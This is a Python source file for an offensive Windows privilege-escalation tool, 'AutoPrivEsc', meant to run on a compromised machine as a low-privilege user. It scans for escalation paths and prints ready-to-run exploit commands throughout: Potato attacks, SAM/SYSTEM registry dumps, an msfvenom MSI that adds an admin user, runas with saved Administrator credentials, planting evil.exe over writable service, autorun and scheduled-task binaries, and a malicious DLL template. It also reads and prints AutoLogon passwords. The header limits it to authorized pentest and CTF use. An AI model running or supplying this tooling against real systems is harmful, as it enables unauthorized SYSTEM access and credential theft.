#!/usr/bin/env python3
"""
AutoPrivEsc — Windows Privilege Escalation Scanner & Auto-Exploiter
=====================================================================
Runs on a compromised Windows machine as a low-privilege user.
Automatically:
1. Scans for common Windows privilege escalation vectors
2. Attempts to exploit each found vector
3. Reports what succeeded and what failed

Vectors covered:
- SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege (Potato attacks)
- AlwaysInstallElevated (MSI abuse)
- Unquoted Service Paths
- Weak Service Permissions (writable binaries/configs)
- Stored Credentials (cmdkey, registry, SAM)
- AutoRun / Registry Run Keys
- Weak Registry Permissions on services
- Scheduled Tasks run as SYSTEM with writable binaries
- DLL Hijacking opportunities

Usage:
python autoprivesc_win.py # scan + auto-exploit
python autoprivesc_win.py --scan # scan only
python autoprivesc_win.py --report # save report to file

WARNING:
For authorized use in CTF, lab, and pentest environments only.
"""

import os
import sys
import subprocess
import argparse
import winreg
import ctypes
from datetime import datetime


# ─────────────────────────────────────────────
# Colors (Windows ANSI support)
# ─────────────────────────────────────────────

# Enable ANSI colors on Windows 10+
os.system("")

class C:
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def red(t): return f"{C.RED}{t}{C.RESET}"
def green(t): return f"{C.GREEN}{t}{C.RESET}"
def yellow(t): return f"{C.YELLOW}{t}{C.RESET}"
def bold(t): return f"{C.BOLD}{t}{C.RESET}"
def cyan(t): return f"{C.CYAN}{t}{C.RESET}"


# ─────────────────────────────────────────────
# Results Tracker
# ─────────────────────────────────────────────

results = {
"found": [],
"exploited": [],
"failed": [],
}

def log_found(vector, detail):
results["found"].append({"vector": vector, "detail": detail})

def log_exploited(vector, cmd):
results["exploited"].append({"vector": vector, "cmd": cmd})

def log_failed(vector, reason):
results["failed"].append({"vector": vector, "reason": reason})


# ─────────────────────────────────────────────
# Utility Functions
# ─────────────────────────────────────────────

def run_cmd(cmd, timeout=10):
"""Runs a Windows shell command and returns stdout, stderr, returncode."""
try:
result = subprocess.run(
cmd, shell=True, capture_output=True,
text=True, timeout=timeout, encoding="utf-8", errors="ignore"
)
return result.stdout.strip(), result.stderr.strip(), result.returncode
except subprocess.TimeoutExpired:
return "", "TIMEOUT", -1
except Exception as e:
return "", str(e), -1


def is_admin():
"""Checks if the current process has admin privileges."""
try:
return ctypes.windll.shell32.IsUserAnAdmin()
except Exception:
return False


def get_current_user():
return os.environ.get("USERNAME", "unknown")


def section(title):
print(f"\n{bold(cyan('═' * 55))}")
print(f" {bold(title)}")
print(f"{bold(cyan('═' * 55))}")


def found(msg): print(f" {yellow('[FOUND]')} {msg}")
def exploited(msg): print(f" {green('[EXPLOITED]')} {msg}")
def failed(msg): print(f" {red('[FAILED]')} {msg}")
def info(msg): print(f" {cyan('[*]')} {msg}")
def skip(msg): print(f" [-] {msg}")


# ─────────────────────────────────────────────
# Vector 1 — Token Privileges (Potato Attacks)
# ─────────────────────────────────────────────

def check_token_privileges(exploit=True):
"""
Checks for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.

These privileges are typically held by service accounts (IIS, MSSQL, etc.)
and are exploitable via 'Potato' attacks:
- JuicyPotato (older Windows)
- PrintSpoofer (Windows 10 / Server 2019)
- GodPotato (latest, works on most versions)

The exploit tricks a SYSTEM process into authenticating to us,
then impersonates its token to execute commands as SYSTEM.
"""
section("VECTOR 1 — Token Privileges (Potato Attacks)")
info("Checking current token privileges...")

stdout, _, _ = run_cmd("whoami /priv")
print(f"\n{stdout}\n")

dangerous_privs = [
"SeImpersonatePrivilege",
"SeAssignPrimaryTokenPrivilege",
"SeDebugPrivilege",
"SeBackupPrivilege",
"SeRestorePrivilege",
"SeTakeOwnershipPrivilege",
"SeLoadDriverPrivilege",
]

for priv in dangerous_privs:
if priv in stdout and "Enabled" in stdout:
found(f"{priv} is ENABLED!")
log_found("TOKEN_PRIVILEGE", priv)

if exploit:
if priv in ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"]:
print(f"\n {bold('Recommended exploit: PrintSpoofer or GodPotato')}")
print(f" {yellow('Download PrintSpoofer:')}")
print(f" https://github.com/itm4n/PrintSpoofer/releases")
print(f"\n {yellow('Run:')}")
print(f" PrintSpoofer.exe -i -c cmd.exe")
print(f"\n {yellow('Or with GodPotato:')}")
print(f" GodPotato.exe -cmd 'cmd /c whoami'")
log_exploited("TOKEN_PRIVILEGE", "PrintSpoofer.exe -i -c cmd.exe")

elif priv == "SeDebugPrivilege":
print(f"\n {bold('SeDebugPrivilege — can inject into SYSTEM processes')}")
print(f" {yellow('Use Meterpreter getsystem or migrate to lsass.exe')}")
log_exploited("SeDebugPrivilege", "migrate to lsass / getsystem")

elif priv == "SeBackupPrivilege":
print(f"\n {bold('SeBackupPrivilege — can read any file including SAM/SYSTEM')}")
cmd = "reg save HKLM\\SAM C:\\Temp\\SAM && reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM"
print(f" {yellow(cmd)}")
log_exploited("SeBackupPrivilege", cmd)


# ─────────────────────────────────────────────
# Vector 2 — AlwaysInstallElevated
# ─────────────────────────────────────────────

def check_always_install_elevated(exploit=True):
"""
Checks if AlwaysInstallElevated is enabled in both HKLM and HKCU.

When both registry keys are set to 1, any user can install MSI packages
with SYSTEM privileges — even without admin rights.

Exploit: craft a malicious MSI that adds a local admin or runs a payload.
"""
section("VECTOR 2 — AlwaysInstallElevated")
info("Checking registry for AlwaysInstallElevated...")

keys = [
r"SOFTWARE\Policies\Microsoft\Windows\Installer",
]

hklm_val = None
hkcu_val = None

for key_path in keys:
try:
# Check HKLM
key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
hklm_val, _ = winreg.QueryValueEx(key, "AlwaysInstallElevated")
winreg.CloseKey(key)
except Exception:
pass

try:
# Check HKCU
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
hkcu_val, _ = winreg.QueryValueEx(key, "AlwaysInstallElevated")
winreg.CloseKey(key)
except Exception:
pass

if hklm_val == 1 and hkcu_val == 1:
found("AlwaysInstallElevated is ENABLED in both HKLM and HKCU!")
log_found("ALWAYS_INSTALL_ELEVATED", "Both keys set to 1")

if exploit:
print(f"\n {bold('Exploit — generate malicious MSI with msfvenom:')}")
cmd = "msfvenom -p windows/adduser USER=hacker PASS=Hacker123! -f msi -o evil.msi"
print(f" {yellow(cmd)}")
print(f"\n {bold('Then install it:')}")
run_cmd2 = "msiexec /quiet /qn /i evil.msi"
print(f" {yellow(run_cmd2)}")
log_exploited("ALWAYS_INSTALL_ELEVATED", run_cmd2)
else:
skip(f"AlwaysInstallElevated not enabled (HKLM={hklm_val}, HKCU={hkcu_val})")


# ─────────────────────────────────────────────
# Vector 3 — Unquoted Service Paths
# ─────────────────────────────────────────────

def check_unquoted_service_paths(exploit=True):
"""
Looks for Windows services with unquoted paths containing spaces.

When a service path like:
C:\\Program Files\\My App\\service.exe
is not quoted, Windows tries to execute:
C:\\Program.exe
C:\\Program Files\\My.exe
C:\\Program Files\\My App\\service.exe
in that order.

If we can write to C:\\Program.exe or C:\\Program Files\\My.exe,
we win — our binary runs as SYSTEM when the service starts.
"""
section("VECTOR 3 — Unquoted Service Paths")
info("Scanning all services for unquoted paths with spaces...")

stdout, _, _ = run_cmd(
'wmic service get name,displayname,pathname,startmode | '
'findstr /i "auto" | findstr /i /v "C:\\\\Windows\\\\" | '
'findstr /i /v """"'
)

if not stdout:
skip("No unquoted service paths found.")
return

vuln_services = []

for line in stdout.splitlines():
if not line.strip():
continue
parts = line.split()
for part in parts:
# Path has spaces and is not quoted
if "\\" in part and " " in part and not part.startswith('"'):
vuln_services.append(line.strip())
break

if not vuln_services:
skip("No exploitable unquoted service paths found.")
return

for svc in vuln_services:
found(f"Unquoted path: {svc[:80]}")
log_found("UNQUOTED_SERVICE", svc)

if exploit:
# Find the exploitable insertion point
# e.g. C:\Program Files\Vulnerable App\service.exe
# → try to write C:\Program.exe or C:\Program Files\Vulnerable.exe
path_parts = svc.split("\\")
for i in range(1, len(path_parts)):
candidate = "\\".join(path_parts[:i])
if " " in path_parts[i - 1]:
inject_path = candidate + ".exe"
parent_dir = "\\".join(inject_path.split("\\")[:-1])

if os.path.isdir(parent_dir) and os.access(parent_dir, os.W_OK):
print(f"\n {bold('Writable injection point:')} {inject_path}")
cmd = f"copy C:\\Windows\\System32\\cmd.exe {inject_path}"
print(f" {yellow('Plant payload:')} {cmd}")
print(f" {yellow('Then restart service or reboot')}")
log_exploited("UNQUOTED_SERVICE", cmd)

try:
import shutil
# In a real scenario you'd copy your payload here
# We just log the opportunity
pass
except Exception as e:
failed(str(e))
break


# ─────────────────────────────────────────────
# Vector 4 — Weak Service Permissions
# ─────────────────────────────────────────────

def check_weak_service_permissions(exploit=True):
"""
Checks if the current user can modify service binaries or their configs.

If we can overwrite the executable a service runs as SYSTEM,
we replace it with our payload — it runs as SYSTEM on next start.
"""
section("VECTOR 4 — Weak Service Binary Permissions")
info("Checking service binary permissions...")

stdout, _, _ = run_cmd("wmic service get name,pathname 2>nul")

checked = 0
for line in stdout.splitlines():
if not line.strip() or "PathName" in line:
continue

# Extract path — may be quoted
parts = line.strip().split()
path = None
for part in parts:
if part.endswith(".exe") or ".exe" in part:
path = part.strip('"')
break

if not path or not os.path.isfile(path):
continue

checked += 1
# Check if we can write to the binary
if os.access(path, os.W_OK):
found(f"Writable service binary: {path}")
log_found("WEAK_SERVICE_BINARY", path)

if exploit:
print(f"\n {bold('Exploit — replace binary with payload:')}")
cmd = f"copy evil.exe \"{path}\""
print(f" {yellow(cmd)}")
print(f" {yellow('Then: sc start <servicename>')}")
log_exploited("WEAK_SERVICE_BINARY", cmd)

info(f"Checked {checked} service binaries.")
if not any(r["vector"] == "WEAK_SERVICE_BINARY" for r in results["found"]):
skip("No writable service binaries found.")


# ─────────────────────────────────────────────
# Vector 5 — Stored Credentials
# ─────────────────────────────────────────────

def check_stored_credentials(exploit=True):
"""
Hunts for credentials stored in common Windows locations:
- Windows Credential Manager (cmdkey /list)
- Common config files (Unattend.xml, web.config, etc.)
- Registry autologon keys
- SNMP community strings
"""
section("VECTOR 5 — Stored Credentials")

# Check cmdkey stored credentials
info("Checking Windows Credential Manager (cmdkey)...")
stdout, _, _ = run_cmd("cmdkey /list")
if "Target:" in stdout:
found("Stored credentials found in Credential Manager!")
print(f"\n{stdout}\n")
log_found("STORED_CREDS_CMDKEY", stdout[:200])

if exploit:
print(f" {bold('Exploit — run command as stored user:')}")
cmd = 'runas /savecred /user:DOMAIN\\Administrator "cmd.exe"'
print(f" {yellow(cmd)}")
log_exploited("STORED_CREDS_CMDKEY", cmd)
else:
skip("No credentials in Credential Manager.")

# Check registry autologon
info("Checking registry for AutoLogon credentials...")
autologon_keys = [
(winreg.HKEY_LOCAL_MACHINE,
r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"),
]
for hive, key_path in autologon_keys:
try:
key = winreg.OpenKey(hive, key_path)
for val_name in ["DefaultUserName", "DefaultPassword", "AltDefaultPassword"]:
try:
val, _ = winreg.QueryValueEx(key, val_name)
if val:
found(f"AutoLogon credential — {val_name}: {val}")
log_found("AUTOLOGON_CREDS", f"{val_name}={val}")
except Exception:
pass
winreg.CloseKey(key)
except Exception:
pass

# Check common unattended install files
info("Searching for unattended install files with credentials...")
unattend_paths = [
r"C:\Windows\Panther\Unattend.xml",
r"C:\Windows\Panther\Unattended.xml",
r"C:\Windows\System32\sysprep\sysprep.xml",
r"C:\Windows\System32\sysprep\Panther\unattend.xml",
r"C:\unattend.xml",
r"C:\autounattend.xml",
]
for path in unattend_paths:
if os.path.isfile(path):
found(f"Unattended install file found: {path}")
log_found("UNATTEND_FILE", path)
if exploit:
# Read and look for password tags
try:
with open(path, "r", errors="ignore") as f:
content = f.read()
if "Password" in content or "password" in content:
print(f" {yellow('File contains password fields — check:')} {path}")
log_exploited("UNATTEND_FILE", f"cat {path}")
except Exception:
pass


# ─────────────────────────────────────────────
# Vector 6 — Registry Run Keys (AutoRun)
# ─────────────────────────────────────────────

def check_autorun_registry(exploit=True):
"""
Checks AutoRun registry keys for writable program paths.

Programs listed in Run/RunOnce keys execute on login/boot.
If we can overwrite the binary they point to, our payload
runs as whoever triggers the autorun (often admin/SYSTEM).
"""
section("VECTOR 6 — AutoRun Registry Keys")
info("Checking AutoRun registry keys...")

run_keys = [
(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
]

for hive, key_path in run_keys:
try:
key = winreg.OpenKey(hive, key_path)
i = 0
while True:
try:
name, value, _ = winreg.EnumValue(key, i)
i += 1

# Extract executable path from value
exe_path = value.strip('"').split('"')[0].split()[0]
hive_name = "HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU"
info(f"{hive_name}\\...\\Run → {name}: {value[:60]}")

if os.path.isfile(exe_path) and os.access(exe_path, os.W_OK):
found(f"Writable AutoRun binary: {exe_path}")
log_found("AUTORUN_WRITABLE", exe_path)

if exploit:
cmd = f"copy evil.exe \"{exe_path}\""
print(f" {bold('Exploit:')} {yellow(cmd)}")
print(f" {yellow('Payload runs on next login/reboot')}")
log_exploited("AUTORUN_WRITABLE", cmd)

except OSError:
break
winreg.CloseKey(key)
except Exception:
pass


# ─────────────────────────────────────────────
# Vector 7 — Scheduled Tasks
# ─────────────────────────────────────────────

def check_scheduled_tasks(exploit=True):
"""
Lists scheduled tasks running as SYSTEM or Administrators,
and checks if their binary paths are writable.

If we can overwrite the binary a SYSTEM task runs,
our payload executes as SYSTEM on the next trigger.
"""
section("VECTOR 7 — Scheduled Tasks")
info("Looking for SYSTEM-level scheduled tasks with writable binaries...")

stdout, _, _ = run_cmd(
'schtasks /query /fo LIST /v 2>nul | findstr /i "task name\\|run as user\\|task to run"'
)

tasks = {}
current_task = None

for line in stdout.splitlines():
line = line.strip()
if line.startswith("Task Name:"):
current_task = line.split(":", 1)[1].strip()
tasks[current_task] = {}
elif line.startswith("Run As User:") and current_task:
tasks[current_task]["user"] = line.split(":", 1)[1].strip()
elif line.startswith("Task To Run:") and current_task:
tasks[current_task]["cmd"] = line.split(":", 1)[1].strip()

for task_name, task_info in tasks.items():
user = task_info.get("user", "")
cmd = task_info.get("cmd", "")

# Only care about SYSTEM/admin tasks
if "SYSTEM" not in user.upper() and "ADMINISTRATOR" not in user.upper():
continue

# Extract executable
exe = cmd.strip('"').split('"')[0].split()[0] if cmd else ""

if exe and os.path.isfile(exe) and os.access(exe, os.W_OK):
found(f"Writable SYSTEM task binary: {exe}")
found(f"Task: {task_name} | Runs as: {user}")
log_found("SCHEDULED_TASK", f"{task_name} → {exe}")

if exploit:
replace_cmd = f"copy evil.exe \"{exe}\""
trigger_cmd = f'schtasks /run /tn "{task_name}"'
print(f"\n {bold('Exploit:')}")
print(f" 1. {yellow(replace_cmd)}")
print(f" 2. {yellow(trigger_cmd)}")
log_exploited("SCHEDULED_TASK", f"{replace_cmd} && {trigger_cmd}")

if not any(r["vector"] == "SCHEDULED_TASK" for r in results["found"]):
skip("No exploitable scheduled tasks found.")


# ─────────────────────────────────────────────
# Vector 8 — DLL Hijacking
# ─────────────────────────────────────────────

def check_dll_hijacking(exploit=True):
"""
Looks for DLL hijacking opportunities in writable directories
that appear early in the DLL search order.

Windows searches for DLLs in this order:
1. The directory of the application
2. System directories (System32, etc.)
3. Directories in %PATH%

If a privileged process loads a DLL from a writable directory,
we can plant a malicious DLL there and get code execution.
"""
section("VECTOR 8 — DLL Hijacking")
info("Checking %PATH% for writable directories...")

path_dirs = os.environ.get("PATH", "").split(";")
writable = []

for d in path_dirs:
d = d.strip()
if d and os.path.isdir(d) and os.access(d, os.W_OK):
# Skip system dirs — too risky/unlikely
if "system32" not in d.lower() and "windows" not in d.lower():
found(f"Writable PATH directory: {d}")
log_found("DLL_HIJACK_PATH", d)
writable.append(d)

if not writable:
skip("No writable non-system directories in %PATH%.")
return

if exploit:
print(f"\n {bold('DLL Hijacking approach:')}")
print(f" 1. Use Process Monitor to find DLLs loaded from writable dirs")
print(f" 2. Create a malicious DLL with the same name")
print(f" 3. Place it in: {yellow(writable[0])}")
print(f"\n {bold('Minimal malicious DLL template (C):')}")
dll_code = """
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpv) {
if (fdwReason == DLL_PROCESS_ATTACH) {
system("net localgroup administrators hacker /add");
}
return TRUE;
}"""
print(yellow(dll_code))
log_exploited("DLL_HIJACK", f"Plant malicious DLL in {writable[0]}")


# ─────────────────────────────────────────────
# System Info Gathering
# ─────────────────────────────────────────────

def gather_sysinfo():
"""Collects basic system information useful for manual exploitation."""
section("SYSTEM INFORMATION")

stdout, _, _ = run_cmd("systeminfo 2>nul")

# Extract key fields
fields = ["Host Name", "OS Name", "OS Version", "System Type",
"Hotfix(s)", "Domain"]
for line in stdout.splitlines():
for field in fields:
if line.startswith(field):
print(f" {line.strip()}")

# Current user and groups
print()
info("Current user and group memberships:")
stdout, _, _ = run_cmd("whoami /all 2>nul")
print(stdout[:500])


# ─────────────────────────────────────────────
# Final Report
# ─────────────────────────────────────────────

def print_report(save_to_file=False):
section("FINAL REPORT")

print(f"\n {bold('Target user:')} {get_current_user()}")
print(f" {bold('Admin: ')} {'YES' if is_admin() else red('NO')}")
print(f" {bold('Scan time: ')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

print(f"\n {bold('Vectors found: ')} {yellow(str(len(results['found'])))}")
print(f" {bold('Exploits ready: ')} {green(str(len(results['exploited'])))}")
print(f" {bold('Failed attempts: ')} {red(str(len(results['failed'])))}")

if results["exploited"]:
print(f"\n {bold(green(' EXPLOIT COMMANDS TO RUN:'))}")
for item in results["exploited"]:
print(f"\n [{item['vector']}]")
print(f" {yellow(item['cmd'])}")

if results["found"] and not results["exploited"]:
print(f"\n {bold(yellow('! VECTORS FOUND — manual exploitation needed:'))}")
for item in results["found"]:
print(f" [{item['vector']}] {item['detail'][:80]}")

if not results["found"]:
print(f"\n {red('No obvious privilege escalation vectors found.')}")
print(f" Consider: kernel exploits (check OS version), password spraying,")
print(f" Kerberoasting, AS-REP Roasting if domain-joined.")

if save_to_file:
report_path = os.path.join(
os.environ.get("TEMP", "C:\\Temp"),
f"privesc_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
)
try:
with open(report_path, "w") as f:
f.write(f"AutoPrivEsc Windows Report — {datetime.now()}\n")
f.write(f"User: {get_current_user()}\n\n")
for section_name, items in results.items():
f.write(f"\n{'='*40}\n{section_name.upper()}\n{'='*40}\n")
for item in items:
f.write(str(item) + "\n")
print(f"\n {green('Report saved to:')} {report_path}")
except Exception as e:
failed(f"Could not save report: {e}")


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────

def main():
# Windows-only check
if sys.platform != "win32":
print(red("[!] This script is for Windows only."))
print(" For Linux, use autoprivesc.py instead.")
sys.exit(1)

parser = argparse.ArgumentParser(
description="AutoPrivEsc — Windows Privilege Escalation Auto-Exploiter"
)
parser.add_argument("--scan", action="store_true", help="Scan only — no exploitation")
parser.add_argument("--report", action="store_true", help="Save report to TEMP folder")
args = parser.parse_args()

exploit = not args.scan

print(f"\n{'═' * 55}")
print(bold(cyan(" AutoPrivEsc — Windows PrivEsc Scanner & Exploiter")))
print(f"{'═' * 55}")
print(f" User : {get_current_user()}")
print(f" Admin : {'YES' if is_admin() else red('NO')}")
print(f" Mode : {'SCAN ONLY' if args.scan else bold(red('SCAN + EXPLOIT'))}")
print(f" Time : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"{'═' * 55}")

if is_admin():
print(green("\n[+] Already running as Administrator!"))
sys.exit(0)

# Gather system info first
gather_sysinfo()

# Run all vectors
check_token_privileges(exploit)
check_always_install_elevated(exploit)
check_unquoted_service_paths(exploit)
check_weak_service_permissions(exploit)
check_stored_credentials(exploit)
check_autorun_registry(exploit)
check_scheduled_tasks(exploit)
check_dll_hijacking(exploit)

# Summary
print_report(save_to_file=args.report)


if __name__ == "__main__":
main()
